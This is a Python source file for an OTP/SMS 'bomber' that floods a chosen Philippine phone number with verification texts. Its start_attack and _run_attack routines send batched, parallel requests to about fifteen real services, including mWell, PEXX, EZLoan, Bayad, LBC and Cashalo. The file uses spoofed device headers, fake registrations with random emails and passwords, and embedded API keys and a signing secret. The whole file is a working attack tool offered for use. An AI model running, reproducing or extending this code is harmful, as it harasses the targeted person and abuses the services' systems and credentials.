import threading
import time
import random
import string
import requests
import hashlib
import uuid
import json
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

class ServiceWorker:
    def __init__(self, name, socketio):
        self.name = name
        self.socketio = socketio
        self.queue = Queue()
        self.running = False
        self.current_cooldown = 0
        self.worker_thread = None
        self.results = {}
        
    def start(self):
        self.running = True
        self.worker_thread = threading.Thread(target=self._worker_loop, daemon=True)
        self.worker_thread.start()
    
    def stop(self):
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=5)
    
    def add_task(self, phone_number, batch_num):
        self.queue.put((phone_number, batch_num))
    
    def _worker_loop(self):
        while self.running:
            try:
                if not self.queue.empty():
                    phone_number, batch_num = self.queue.get(timeout=1)
                    
                    if self.current_cooldown > 0:
                        time.sleep(self.current_cooldown)
                    
                    success, message, new_cooldown = self._send_request(phone_number)
                    
                    self.results[batch_num] = {
                        'success': success,
                        'message': message,
                        'timestamp': datetime.now().strftime("%H:%M:%S")
                    }
                    
                    self.socketio.emit('worker_result', {
                        'worker': self.name,
                        'batch': batch_num,
                        'success': success,
                        'message': message,
                        'timestamp': self.results[batch_num]['timestamp']
                    })
                    
                    if new_cooldown > 0:
                        self.current_cooldown = new_cooldown
                    else:
                        self.current_cooldown = 5
                    
                    self.queue.task_done()
                else:
                    time.sleep(0.5)
            except Exception as e:
                print(f"[{self.name} Error]: {str(e)[:50]}")
                time.sleep(2)
    
    def _send_request(self, phone_number):
        pass
    
    def get_result(self, batch_num):
        return self.results.get(batch_num)
    
    def has_pending_tasks(self):
        return not self.queue.empty()
    
    def queue_size(self):
        return self.queue.qsize()

class MWELLWorker(ServiceWorker):
    def __init__(self, socketio):
        super().__init__("MWELL", socketio)
    
    def _send_request(self, phone_number):
        try:
            formatted_phone = self._format_phone(phone_number)
            
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
                'x-app-version': random.choice(['03.942.035', '03.942.036', '03.942.037', '03.942.038']),
                'x-device-type': 'android',
                'x-device-model': random.choice(['oneplus CPH2465', 'samsung SM-G998B', 'xiaomi Redmi Note 13']),
                'x-timestamp': str(int(time.time() * 1000)),
                'x-request-id': self._random_string(16)
            }
            
            data = {
                "country": "PH",
                "phoneNumber": formatted_phone,
                "phoneNumberPrefix": "+63"
            }
            
            response = requests.post('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', 
                                   headers=headers, json=data, timeout=20)
            
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('c') == 200:
                    cooldown = 0
                    if 'd' in resp_json and 'resendAt' in resp_json['d']:
                        try:
                            resend_at_str = resp_json['d']['resendAt']
                            resend_time = datetime.fromisoformat(resend_at_str.replace('Z', '+00:00'))
                            current_time = datetime.now(timezone.utc)
                            cooldown = max(1, (resend_time - current_time).total_seconds())
                        except:
                            cooldown = 60
                    return True, "OTP sent successfully", cooldown
                else:
                    return False, f"API Error: Code {resp_json.get('c')}", 30
            else:
                return False, f"HTTP {response.status_code}", 30
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}", 30
    
    def _format_phone(self, phone):
        phone = str(phone).strip()
        phone = phone.replace(' ', '').replace('-', '').replace('+', '')
        if phone.startswith('0'):
            phone = phone[1:]
        elif phone.startswith('63'):
            phone = phone[2:]
        return phone
    
    def _random_string(self, length):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

class PEXXWorker(ServiceWorker):
    def __init__(self, socketio):
        super().__init__("PEXX", socketio)
    
    def _send_request(self, phone_number):
        try:
            formatted_phone = self._format_phone(phone_number)
            
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'x-msession-id': 'undefined',
                'x-oid': '',
                'tid': self._random_string(11),
                'appversion': '3.0.14',
                'sentry-trace': self._random_string(32),
                'baggage': 'sentry-environment=production,sentry-public_key=811267d2b611af4416884dd91d0e093c,sentry-trace_id=' + self._random_string(32)
            }
            
            data = {
                "0": {
                    "json": {
                        "email": "",
                        "areaCode": "+63",
                        "phone": f"+63{formatted_phone}",
                        "otpChannel": "TG",
                        "otpUsage": "REGISTRATION"
                    }
                }
            }
            
            response = requests.post('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1',
                                   headers=headers, json=data, timeout=20)
            
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    if isinstance(resp_json, list) and len(resp_json) > 0:
                        result_data = resp_json[0].get('result', {}).get('data', {}).get('json', {})
                        if result_data.get('code') == 200:
                            cooldown = result_data.get('data', {}).get('resendTimeInSec', 60)
                            return True, "OTP sent successfully", cooldown
                        else:
                            return False, f"API Error: {result_data.get('msg', 'Unknown error')}", 30
                    else:
                        return False, "Invalid response format", 30
                except:
                    return False, "Response parsing error", 30
            else:
                return False, f"HTTP {response.status_code}", 30
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}", 30
    
    def _format_phone(self, phone):
        phone = str(phone).strip()
        phone = phone.replace(' ', '').replace('-', '').replace('+', '')
        if phone.startswith('0'):
            phone = phone[1:]
        elif phone.startswith('63'):
            phone = phone[2:]
        return phone
    
    def _random_string(self, length):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

class BombService:
    def __init__(self, name, func, socketio):
        self.name = name
        self.func = func
        self.socketio = socketio
    
    def execute(self, phone_number, batch_num=None):
        try:
            if batch_num:
                success, message = self.func(phone_number, batch_num)
            else:
                success, message = self.func(phone_number)
            
            self.socketio.emit('service_result', {
                'service': self.name,
                'batch': batch_num,
                'success': success,
                'message': message,
                'timestamp': datetime.now().strftime("%H:%M:%S")
            })
            
            return success, message
        except Exception as e:
            self.socketio.emit('service_result', {
                'service': self.name,
                'batch': batch_num,
                'success': False,
                'message': f"Error: {str(e)[:50]}",
                'timestamp': datetime.now().strftime("%H:%M:%S")
            })
            return False, str(e)

class BombController:
    def __init__(self, socketio):
        self.socketio = socketio
        self.mwell_worker = MWELLWorker(socketio)
        self.pexx_worker = PEXXWorker(socketio)
        self.services = []
        self.is_running = False
        self.stats = {
            'success': 0,
            'fail': 0,
            'total': 0
        }
        
    def register_service(self, name, func):
        self.services.append(BombService(name, func, self.socketio))
    
    def _format_phone(self, phone):
        phone = str(phone).strip()
        phone = phone.replace(' ', '').replace('-', '').replace('+', '')
        if phone.startswith('0'):
            phone = phone[1:]
        elif phone.startswith('63'):
            phone = phone[2:]
        return phone
    
    def _random_string(self, length):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _random_gmail(self):
        n = random.randint(8, 12)
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n)) + "@gmail.com"
    
    def _generate_kumu_signature(self, timestamp, random_str, phone_number):
        secret = "kumu_secret_2024"
        data = f"{timestamp}{random_str}{phone_number}{secret}"
        return hashlib.sha256(data.encode()).hexdigest()
    
    # Service implementations
    def send_bomb_otp(self, phone_number):
        try:
            formatted_phone = self._format_phone(phone_number)
            headers = {
                'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465; OP5958L1; arm64-v8a)',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'region': 'PH'
            }
            credentials = {
                "userName": formatted_phone,
                "phoneCode": "63",
                "password": f"TempPass{random.randint(1000, 9999)}!"
            }
            response = requests.post("https://prod.services.osim-cloud.com/identity/api/v1.0/account/register", 
                                   headers=headers, json=credentials, timeout=8)
            if response.status_code == 200:
                result = response.json()
                if result.get('resultCode', 0) in [201000, 200000]:
                    return True, result.get('message', 'Bomb sent')
                else:
                    return False, result.get('message', f"Failed with code {result.get('resultCode')}")
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_ezloan(self, phone_number):
        try:
            formatted_phone = self._format_phone(phone_number)
            current_time = int(time.time() * 1000)
            
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'imei': '7a997625bd704baebae5643a3289eb33',
                'device': 'android',
                'brand': 'oneplus',
                'model': 'CPH2465',
                'source': 'EZLOAN',
                'appversion': '2.0.4',
                'businessid': 'EZLOAN',
                'blackbox': f'kGPGg{current_time}DCl3O8MVBR0',
            }
            
            data = {
                "businessId": "EZLOAN",
                "contactNumber": f"+63{formatted_phone}",
                "appsflyerIdentifier": f"{current_time}-{random.randint(1000000000000000000, 9999999999999999999)}"
            }
            
            response = requests.post('https://gateway.ezloancash.ph/security/auth/otp/request', 
                                   headers=headers, json=data, timeout=8)
            
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('code') == 0:
                    return True, resp_json.get('msg', 'Sent successfully')
                else:
                    return False, resp_json.get('msg', 'Request failed')
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_xpress(self, phone_number, index):
        try:
            headers = {
                "User-Agent": "Dalvik/2.1.0", 
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
            timestamp = int(time.time())
            data = {
                "FirstName": f"User{timestamp}_{index}",
                "LastName": "Test",
                "Email": f"user{timestamp}_{index}@gmail.com",
                "Phone": f"+63{self._format_phone(phone_number)}",
                "Password": f"Pass{random.randint(1000, 9999)}",
                "ConfirmPassword": f"Pass{random.randint(1000, 9999)}"
            }
            response = requests.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", 
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                return True, "OTP sent to phone"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_abenson(self, phone_number):
        try:
            headers = {
                'User-Agent': 'okhttp/4.9.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json'
            }
            data = f'contact_no={phone_number}&login_token=undefined'
            response = requests.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', 
                                   headers=headers, data=data, timeout=8)
            if response.status_code == 200:
                return True, "OTP activation sent"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_excellent_lending(self, phone_number):
        try:
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Content-Type': 'application/json; charset=utf-8',
                'Accept': 'application/json'
            }
            data = {
                "domain": phone_number,
                "cat": "login",
                "previous": False,
                "financial": self._random_string(32)
            }
            response = requests.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', 
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                return True, "Request processed"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_bistro(self, phone_number):
        try:
            formatted_phone = self._format_phone(phone_number)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate',
                'origin': 'http://localhost',
                'x-requested-with': 'com.allcardtech.bistro',
                'accept-language': 'en-US,en;q=0.9',
            }
            
            url = f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted_phone}'
            
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('isSuccessful') == True:
                    return True, resp_json.get('message', 'OTP sent successfully')
                else:
                    return False, f"API Error: {resp_json.get('message', 'Unknown error')}"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_bayad(self, phone_number):
        try:
            formatted_phone = self._format_phone(phone_number)
            bayad_phone = f"+63{formatted_phone}"
            
            headers = {
                "accept": 'application/json, text/plain, */*',
                "accept-language": 'en-US',
                "content-type": 'application/json',
                "origin": 'https://www.online.bayad.com',
                "referer": 'https://www.online.bayad.com/',
                "user-agent": 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            }
            
            email = self._random_gmail()
            
            payload = {
                "mobileNumber": bayad_phone, 
                "emailAddress": email
            }
            
            response = requests.post(
                "https://api.online.bayad.com/api/sign-up/otp",
                headers=headers,
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                return True, f"OTP sent to {email}"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_lbc(self, phone_number):
        try:
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json'
            }
            data = {
                'verification_type': 'mobile',
                'client_email': f'{self._random_string(8)}@gmail.com',
                'client_contact_code': '+63',
                'client_contact_no': self._format_phone(phone_number),
                'app_log_uid': self._random_string(16)
            }
            response = requests.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', 
                                   headers=headers, data=data, timeout=8)
            if response.status_code == 200:
                return True, "Verification request sent"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_pickup_coffee(self, phone_number):
        try:
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            data = {
                "mobile_number": f"+63{self._format_phone(phone_number)}",
                "login_method": 'mobile_number'
            }
            response = requests.post('https://production.api.pickup-coffee.net/v2/customers/login', 
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                return True, "Login OTP sent"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_honey_loan(self, phone_number):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            data = {
                "phone": phone_number,
                "is_rights_block_accepted": 1
            }
            response = requests.post('https://api.honeyloan.ph/api/client/registration/step-one', 
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('success') == True:
                    return True, "Registration step one completed"
                else:
                    return False, resp_json.get('message', 'Registration failed')
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_kumu_ph(self, phone_number):
        try:
            formatted_phone = self._format_phone(phone_number)
            
            encrypt_timestamp = int(time.time())
            encrypt_rnd_string = self._random_string(32)
            encrypt_signature = self._generate_kumu_signature(encrypt_timestamp, encrypt_rnd_string, formatted_phone)
            
            headers = {
                'User-Agent': 'okhttp/5.0.0-alpha.14',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json;charset=UTF-8',
                'Device-Type': 'android',
                'Device-Id': '07b76e92c40b536a',
                'Version-Code': '1669',
            }
            
            data = {
                "country_code": "+63",
                "encrypt_rnd_string": encrypt_rnd_string,
                "cellphone": formatted_phone,
                "encrypt_signature": encrypt_signature,
                "encrypt_timestamp": encrypt_timestamp
            }
            
            response = requests.post(
                'https://api.kumuapi.com/v2/user/sendverifysms',
                headers=headers,
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('code') in [200, 403]:
                    return True, resp_json.get('message', 'OTP sent')
                else:
                    return False, f"API Error: {resp_json.get('message', 'Unknown error')}"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_s5_otp(self, phone_number):
        try:
            normalized_phone = f"+63{self._format_phone(phone_number)}"
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            headers = {
                'accept': 'application/json, text/plain, */*',
                'content-type': f'multipart/form-data; boundary={boundary}',
                'user-agent': 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36'
            }
            body = f'--{boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n{normalized_phone}\r\n--{boundary}--\r\n'
            
            response = requests.post('https://api.s5.com/player/api/v1/otp/request', 
                                   headers=headers, data=body, timeout=8)
            if response.status_code == 200:
                return True, "OTP request sent to S5.com"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_cashalo(self, phone_number):
        try:
            formatted_phone = self._format_phone(phone_number)
            
            device_identifier = str(uuid.uuid4())[:16].replace('-', '')
            apps_flyer_id = f"{int(time.time() * 1000)}-{str(uuid.uuid4().int)[:15]}"
            advertising_id = str(uuid.uuid4())
            firebase_id = str(uuid.uuid4().hex)
            
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==',
                'x-device-identifier': device_identifier,
                'x-device-type': '1',
                'x-firebase-instance-id': firebase_id
            }
            
            data = {
                "phone_number": formatted_phone,
                "device_identifier": device_identifier,
                "device_type": 1,
                "apps_flyer_device_id": apps_flyer_id,
                "advertising_id": advertising_id
            }
            
            response = requests.post('https://api.cashaloapp.com/access/register',
                                   headers=headers, json=data, timeout=10)
            
            if response.status_code == 200:
                response_data = response.json()
                if 'access_challenge_request' in response_data:
                    return True, f"OTP sent - Challenge: {response_data['access_challenge_request'][:10]}..."
                else:
                    return False, "Unexpected response format"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def start_attack(self, phone_number, batches):
        if self.is_running:
            return False, "Attack already in progress"
        
        self.is_running = True
        self.stats = {'success': 0, 'fail': 0, 'total': 0}
        
        # Start workers
        self.mwell_worker.start()
        self.pexx_worker.start()
        
        # Queue worker tasks
        for batch_num in range(1, batches + 1):
            self.mwell_worker.add_task(phone_number, batch_num)
            self.pexx_worker.add_task(phone_number, batch_num)
        
        # Start attack thread
        thread = threading.Thread(target=self._run_attack, args=(phone_number, batches))
        thread.daemon = True
        thread.start()
        
        return True, "Attack started"
    
    def _run_attack(self, phone_number, batches):
        try:
            # Register all services
            self.register_service("BOMB OTP", self.send_bomb_otp)
            self.register_service("EZLOAN", self.send_ezloan)
            self.register_service("ABENSON", self.send_abenson)
            self.register_service("EXCELLENT LENDING", self.send_excellent_lending)
            self.register_service("BISTRO", self.send_bistro)
            self.register_service("BAYAD CENTER", self.send_bayad)
            self.register_service("LBC CONNECT", self.send_lbc)
            self.register_service("PICKUP COFFEE", self.send_pickup_coffee)
            self.register_service("HONEY LOAN", self.send_honey_loan)
            self.register_service("KUMU PH", self.send_kumu_ph)
            self.register_service("S5.COM", self.send_s5_otp)
            self.register_service("CASHALO", self.send_cashalo)
            
            # Special case for XPRESS PH (needs index)
            self.register_service("XPRESS PH", 
                                 lambda p, i=None: self.send_xpress(p, i if i else 1))
            
            for batch_num in range(1, batches + 1):
                self.socketio.emit('batch_start', {
                    'batch': batch_num,
                    'total': batches
                })
                
                # Execute all services in parallel
                with ThreadPoolExecutor(max_workers=13) as executor:
                    futures = []
                    for service in self.services:
                        if service.name == "XPRESS PH":
                            future = executor.submit(service.execute, phone_number, batch_num)
                        else:
                            future = executor.submit(service.execute, phone_number)
                        futures.append(future)
                    
                    for future in futures:
                        try:
                            success, _ = future.result(timeout=8)
                            if success:
                                self.stats['success'] += 1
                            else:
                                self.stats['fail'] += 1
                            self.stats['total'] += 1
                        except:
                            self.stats['fail'] += 1
                            self.stats['total'] += 1
                
                self.socketio.emit('stats_update', self.stats)
                
                if batch_num < batches:
                    time.sleep(random.uniform(3, 5))
            
            # Wait for workers to complete
            timeout = 300
            start_time = time.time()
            while (self.mwell_worker.has_pending_tasks() or self.pexx_worker.has_pending_tasks()) and (time.time() - start_time) < timeout:
                time.sleep(2)
            
            # Stop workers
            self.mwell_worker.stop()
            self.pexx_worker.stop()
            
            self.socketio.emit('attack_complete', self.stats)
            self.is_running = False
            
        except Exception as e:
            self.socketio.emit('attack_error', {'error': str(e)})
            self.is_running = False
    
    def get_status(self):
        return {
            'running': self.is_running,
            'stats': self.stats,
            'mwell_pending': self.mwell_worker.queue_size(),
            'pexx_pending': self.pexx_worker.queue_size()
        }